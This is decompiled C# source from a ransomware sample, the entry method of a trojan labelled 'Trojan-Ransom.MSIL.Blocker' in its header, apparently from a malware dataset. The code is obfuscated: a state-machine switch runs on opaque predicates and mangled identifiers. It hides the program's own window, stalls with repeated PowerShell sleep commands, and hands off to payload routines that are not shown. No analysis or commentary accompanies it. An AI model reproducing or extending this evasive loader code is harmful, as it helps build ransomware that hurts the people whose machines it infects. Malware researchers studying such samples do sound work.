// Decompiled with JetBrains decompiler
// Type: ac.Pools.DefinitionSchemaPool
// Assembly: ac, Version=4.10.14393.1198, Culture=neutral, PublicKeyToken=null
// MVID: 71765B6E-1D0D-4AF2-DE12-4A451FD77066
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.09-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-0b19c7363002adca6627b79915e7feb2886b9f55c8af305336ef3992171b0978.exe

using ac.Exporters;
using System;
using System.Diagnostics;
using Tsjxretch.Collections;
using Tsjxretch.Factories;

namespace ac.Pools
{
  public static class DefinitionSchemaPool
  {
    internal static DefinitionSchemaPool PostDic;

    [STAThread]
    public static void MapMerchant(string[] param)
    {
      int num1 = 10;
label_1:
      while (true)
      {
        int num2 = num1;
        IntPtr num3;
        while (true)
        {
          switch (num2)
          {
            case 1:
            case 7:
            case 8:
              if (Database.OrderMerchant())
              {
                if (\u003CModule\u003E\u007B97c19ca2\u002Dd30d\u002D4926\u002Db319\u002D0f9297a6a699\u007D.m_a40ac98667d546268942a61b1ac3f33d == 0)
                {
                  num2 = 4;
                  continue;
                }
                goto label_1;
              }
              else
                goto label_17;
            case 2:
              StateAdapterFactory.GetMerchant("Start-Sleep -s 5").WaitForExit();
              num2 = \u003CModule\u003E\u007B97c19ca2\u002Dd30d\u002D4926\u002Db319\u002D0f9297a6a699\u007D.m_f325a505980d4513a75b01a8cb4f150f == 0 ? 0 : 0;
              continue;
            case 3:
            case 6:
              ReponseFieldExporter.InstantiateMerchant(num3.ToInt32(), 0);
              StateAdapterFactory.GetMerchant("Start-Sleep -s 5").WaitForExit();
              if (\u003CModule\u003E\u007B97c19ca2\u002Dd30d\u002D4926\u002Db319\u002D0f9297a6a699\u007D.m_6170d2f824924d33908c58678f601e42 == 0)
              {
                num2 = 2;
                continue;
              }
              goto label_1;
            case 4:
              goto label_10;
            case 5:
              if (true)
              {
                Console.WriteLine("Test");
                num2 = \u003CModule\u003E\u007B97c19ca2\u002Dd30d\u002D4926\u002Db319\u002D0f9297a6a699\u007D.m_e80e0b6eb45a4e8cae93d950718ba116 != 0 ? 0 : 1;
                continue;
              }
              goto label_9;
            case 9:
              IntPtr mainWindowHandle = Process.GetCurrentProcess().MainWindowHandle;
              if (true)
              {
                num3 = mainWindowHandle;
                if (\u003CModule\u003E\u007B97c19ca2\u002Dd30d\u002D4926\u002Db319\u002D0f9297a6a699\u007D.m_dc40f82dd323485089ad0e79e11f49d0 == 0)
                {
                  num2 = 6;
                  continue;
                }
                goto label_1;
              }
              else
                goto label_5;
            case 10:
              if (param.Length == 0)
              {
                if (\u003CModule\u003E\u007B97c19ca2\u002Dd30d\u002D4926\u002Db319\u002D0f9297a6a699\u007D.m_0c2c6d8570054d4b994b02468af36249 != 0)
                {
                  num2 = 9;
                  continue;
                }
                goto label_1;
              }
              else
                goto case 5;
            default:
              StateAdapterFactory.GetMerchant("Start-Sleep -s 5").WaitForExit();
              if (\u003CModule\u003E\u007B97c19ca2\u002Dd30d\u002D4926\u002Db319\u002D0f9297a6a699\u007D.m_9a63a7152d7443d786ba6cf6214725ae == 0)
              {
                num2 = 8;
                continue;
              }
              goto label_1;
          }
        }
label_5:
        num1 = 3;
        continue;
label_9:
        num1 = 7;
      }
label_10:
      Database.CheckMerchant();
      return;
label_17:;
    }

    internal static bool ResetDic() => DefinitionSchemaPool.PostDic == null;

    internal static DefinitionSchemaPool PatchDic() => DefinitionSchemaPool.PostDic;
  }
}
